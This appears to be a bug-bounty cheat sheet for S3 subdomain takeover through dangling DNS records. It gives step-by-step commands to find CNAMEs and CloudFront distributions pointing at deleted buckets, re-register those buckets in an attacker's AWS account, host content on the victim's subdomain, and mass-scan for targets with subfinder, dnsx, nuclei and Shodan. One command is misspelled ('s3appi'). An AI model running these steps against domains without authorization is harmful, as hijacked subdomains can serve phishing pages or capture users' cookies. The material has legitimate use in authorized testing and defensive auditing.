# S3 Bucket Takeover

Resource: https://blogs.jsmon.sh/hunting-dangling-dns-how-to-exploit-aws-elastic-ips-cloudfront-and-s3/

# Direct S3 CNAME Takeover

## Steps

### 1) Verify that the bucket is gone

Vulnerable Indicator: NoSuchBucket

    curl -s http://assets.pwned.com | grep -i NoSuchBucket

### 2) Get the exact bucket name from the CNAME or error body

Expected result: assets-pwned-com.s3-website-us-east-1.amazonaws.com

    dig CNAME assets.pwned.com

### 3) Create the bucket in your own AWS account (same region)

    aws s3api create-bucket --bucket assets-pwned-com --region us-east-1

### 4) Enable static website hosting

    aws s3 website s3://assets-pwned-com/ --index-document index.html

### 5) Upload PoC

    echo '<p>PWN3D — [your handle] — [date]</p>' > poc.html

Then

    aws s3 cp poc.html s3://assets-pwned-com/ --acl public-read

### 6) Apply public read policy

    aws s3appi put-bucket-policy --bucket assets-pwned-com --policy '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Principal": "*",
        "Action": "s3:GetObject",
        "Resource": "arn:aws:s3:::assets-pwned-com/*"
      }]
    }'

### 7) Visit your PoC file

    http://assets.pwned.com/poc.html

# CloudFront + Deleted S3 Origin

## Steps

### 1) Confirm the distribution is alive but origin is dead

Look for headers:

#### x-cache: Error from cloudfront

OR

#### x-amz-cf-id present + 502/503 response

    curl -sI https://cdn.pwned.com

### 2) Enumerate the bucket name via other means:

JavaScript bundles (https://github.com/robre/jsmon)

    jsmon -d pwned.com | grep -i 's3\|amazonaws'

Github / code search

    "pwned-cdn-assets" site:github.com

Naming conventions - common patterns

    COMPANY-cdn, COMPANY-assets, COMPANY-static, ENV-COMPANY-SERVICE (dev-pwned-cdn)

Git history of infrastructure repositories

    Terraform/CDK that defined the CloudFront origin

Historical error responses (Wayback Machine)

    https://web.archive.org/web/*/cdn.pwned.com

### 3) Confirm the bucket name is free

NoSuchBucket" = available to claim, "AccessDenied" = exists but private (not yours)

    aws s3api head-bucket --bucket CANDIDATE_NAME 2>&1

### 4) Create the bucket, then upload PoC like Attack 1

# Detection Workflow

### 1) Enumerate

    subfinder -d pwned.com -silent | dnsx -silent -resp -a -cname > resolved.txt

### 2) Filter for S3 CNAMEs

    grep -i 'amazonaws.com' resolved.txt | grep -i 's3'

### 3) Probe for NoSuchBucket

    while read line; do
      domain=$(echo "$line" | awk '{print $1}')
      response=$(curl -s "http://$domain")
      if echo "$response" | grep -q 'NoSuchBucket'; then
        echo "[VULNERABLE] $domain"
      fi
    done < s3_candidates.txt

### 4) Automated Fingerprinting

    nuclei -t takeovers/ -l resolved_domains.txt -severity high,critical

### 5) For JS-embedded bucket names (CloudFront + dead origin)

jsmon.sh extracts hostnames from live JS bundles — pipe to dnsx

### 6) Shodan Dork (Optional)

In Shodan search UI, search:

    x-amz-err-code: NoSuchBucket


 
